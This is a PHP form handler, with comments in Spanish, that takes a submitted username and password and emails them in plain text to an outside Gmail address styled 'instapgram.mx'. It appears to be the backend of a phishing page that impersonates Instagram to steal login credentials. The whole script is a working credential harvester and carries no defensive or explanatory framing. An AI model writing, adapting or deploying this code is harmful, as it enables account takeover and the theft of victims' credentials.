<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Configurar el correo
    $to = "instapgram.mx@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@example.com";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado exitosamente.";
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método no permitido.";
}
?>
